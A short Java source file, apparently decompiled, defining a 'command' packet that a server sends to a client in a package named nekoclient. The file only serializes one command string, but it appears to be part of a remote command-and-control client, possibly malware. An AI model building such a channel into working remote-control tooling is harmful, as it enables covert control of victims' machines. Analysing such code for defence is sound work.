package dev.neko.nekoclient.packet.impl.server;

import dev.neko.nekoclient.api.buffer.FriendlyByteBuffer;
import dev.neko.nekoclient.api.buffer.StreamByteBuffer;
import dev.neko.nekoclient.packet.Direction;
import dev.neko.nekoclient.packet.impl.NoncePacket;
import java.io.IOException;

public class CommandPacket extends NoncePacket {
   private String command;

   public CommandPacket() {
   }

   public CommandPacket(String command) {
      this.command = command;
   }

   @Override
   public void read(FriendlyByteBuffer input) throws IOException {
      super.read(input);
      this.command = input.getString();
   }

   @Override
   public void write(StreamByteBuffer output) throws IOException {
      super.write(output);
      output.putString(this.command);
   }

   @Override
   public Direction getDirection() {
      return Direction.SERVER_TO_CLIENT;
   }

   @Override
   public String getName() {
      return "command";
   }

   public final String getCommand() {
      return this.command;
   }
}
